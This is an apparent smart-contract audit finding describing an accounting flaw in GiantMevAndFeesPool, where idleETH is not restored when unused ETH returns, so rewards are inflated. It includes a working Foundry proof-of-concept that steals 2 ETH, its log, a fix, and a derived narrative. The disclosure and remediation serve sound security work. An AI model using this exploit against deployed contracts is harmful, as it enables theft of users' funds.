---
id: 17133
severity: "High"
---

# `GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool` function loses the addition of the idleETH which allows attackers to steal most of eth from the Giant Pool

## Description

The contract GiantMevAndFeesPool override the function totalRewardsReceived:

```solidity
    return address(this).balance + totalClaimed - idleETH;
```

The function totalRewardsReceived is used as the current rewards balance to calculate the unprocessed rewards in the function `SyndicateRewardsProcessor._updateAccumulatedETHPerLP`

```solidity
    uint256 received = totalRewardsReceived();
    uint256 unprocessed = received - totalETHSeen;
```

The idleETH will be decreased in the function `batchDepositETHForStaking` for sending eth to the staking pool. But the idleETH wont be increased in the function `bringUnusedETHBackIntoGiantPool` which is used to burn lp tokens in the staking pool, and the staking pool will send the eth back to the giant pool. And then because of the diminution of the idleETH, the `accumulatedETHPerLPShare` is added out of thin air. So the attacker can steal more eth from the GiantMevAndFeesPool.

## Proof of Concept

test:  
test/foundry/TakeFromGiantPools.t.sol

```solidity
pragma solidity ^0.8.13;

// SPDX-License-Identifier: MIT

import "forge-std/console.sol";
import {GiantPoolTests} from "./GiantPools.t.sol";
import { LPToken } from "../../contracts/liquid-staking/LPToken.sol";

contract TakeFromGiantPools is GiantPoolTests {
    function testDWclaimRewards() public{
        address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);
        address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 4 ether);
        address feesAndMevUserTwo = accountThree; vm.deal(feesAndMevUserTwo, 4 ether);

        // Register BLS key
        registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);

        // Deposit ETH into giant fees and mev
        vm.startPrank(feesAndMevUserOne);
        giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);
        vm.stopPrank();
        vm.startPrank(feesAndMevUserTwo);
        giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);

        bytes[][] memory blsKeysForVaults = new bytes[][](1);
        blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);

        uint256[][] memory stakeAmountsForVaults = new uint256[][](1);
        stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);
        giantFeesAndMevPool.batchDepositETHForStaking(
            getAddressArrayFromValues(address(manager.stakingFundsVault())),
            getUint256ArrayFromValues(4 ether),
            blsKeysForVaults,
            stakeAmountsForVaults
        );
        vm.warp(block.timestamp+31 minutes);
        LPToken[] memory tokens = new LPToken[](1);
        tokens[0] = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyOne);

        LPToken[][] memory allTokens = new LPToken[][](1);
        allTokens[0] = tokens;
        giantFeesAndMevPool.bringUnusedETHBackIntoGiantPool(
            getAddressArrayFromValues(address(manager.stakingFundsVault())),
            allTokens,
            stakeAmountsForVaults
        );
        // inject a NOOP to skip some functions
        address[] memory stakingFundsVaults = new address[](1);
        bytes memory code = new bytes(1);
        code[0] = 0x00;
        vm.etch(address(0x123), code);
        stakingFundsVaults[0] = address(0x123);
        giantFeesAndMevPool.claimRewards(feesAndMevUserTwo, stakingFundsVaults, blsKeysForVaults);
        vm.stopPrank();
        console.log("user one:", getBalance(feesAndMevUserOne));
        console.log("user two(attacker):", getBalance(feesAndMevUserTwo));
        console.log("giantFeesAndMevPool:", getBalance(address(giantFeesAndMevPool)));
    }

    function getBalance(address addr) internal returns (uint){
        // giant LP : eth at ratio of 1:1
        return addr.balance + giantFeesAndMevPool.lpTokenETH().balanceOf(addr);
    }

}
```

run test:

```
forge test --match-test testDWclaimRewards -vvv
```

test log:

```
Logs:
  user one: 4000000000000000000
  user two(attacker): 6000000000000000000
  giantFeesAndMevPool: 6000000000000000000
```

The attacker stole 2 eth from the pool.

## Recommendation

Add

```solidity
    idleETH += _amounts[i];
```

before burnLPTokensForETH in the GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool function.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in the accounting logic of the GiantMevAndFeesPool contract. The pool tracks a variable called idleETH, which represents ETH that is temporarily held while LP tokens are staked. When users deposit ETH, idleETH is decreased accordingly in batchDepositETHForStaking, reflecting that the funds are now allocated to the staking vault. However, when the function bringUnusedETHBackIntoGiantPool is called to retrieve ETH that was not used for staking, the contract correctly transfers the ETH back to the pool but fails to increase the idleETH counter. The totalRewardsReceived view function computes the pool’s effective reward balance as the contract balance plus totalClaimed minus idleETH. Because idleETH is not restored, the subtraction is smaller than it should be, causing totalRewardsReceived to appear larger than the actual ETH held. This inflated value is later used by SyndicateRewardsProcessor._updateAccumulatedETHPerLP to calculate unprocessed rewards and to update accumulatedETHPerLPShare. As a result, the per‑share reward metric is increased “out of thin air”, allowing any caller of claimRewards to receive more ETH than they are entitled to. An attacker can trigger bringUnusedETHBackIntoGiantPool after a staking round, then immediately call claimRewards, stealing ETH from the pool. The impact is a direct loss of funds: the pool’s balance decreases while the attacker’s balance grows, effectively making funds disappear from the protocol’s accounting. The bug manifests when idleETH is decreased on deposit but never increased on return, and when the reward calculation relies on the stale idleETH value. All participants who rely on correct reward distribution – LP token holders, fee and MEV collectors, and end‑users – are affected because the protocol violates its accounting assumptions and promises of fair reward allocation. The issue was uncovered during a Code4rena audit by writing a test that performed a deposit, a staking round, a call to bringUnusedETHBackIntoGiantPool, and then a claimRewards call; the test logs showed the attacker receiving two extra ETH and the pool balance shrinking accordingly. The problem is subtle because the UI may still show normal deposit and withdrawal actions, while the internal accounting mismatch is hidden, making it hard to notice without detailed balance checks. The appropriate remediation is to update the idleETH variable when ETH is returned, for example by adding idleETH += _amounts[i] before burning LP tokens in bringUnusedETHBackIntoGiantPool, thereby restoring the correct accounting and preventing reward over‑allocation. This class of bug is an accounting mismatch or missing state update that leads to reward calculation errors and can be generalized to any contract where a balance‑tracking variable is not correctly reconciled after a transfer.
